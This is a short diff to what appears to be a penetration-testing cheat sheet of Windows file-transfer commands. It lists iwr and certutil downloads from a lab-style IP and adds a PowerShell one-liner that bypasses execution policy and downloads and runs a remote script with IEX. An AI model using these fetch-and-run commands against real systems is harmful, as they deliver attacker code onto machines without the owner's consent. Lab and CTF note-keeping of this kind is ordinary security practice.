@@ -6,6 +6,8 @@ IWR( )
 - powershell.exe iwr -uri 10.10.16.4/file -o C:\Temp\file
 - powershell iwr 10.10.16.4/file -o C:\Temp\file
 
+- powershell.exe -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.200.101.200:20003/PST.ps1')"
+
 Certutil
 - certutil -urlcache -f http://10.10.16.4/file file
 - certutil -urlcache -split -f http://10.10.16.4/file file 
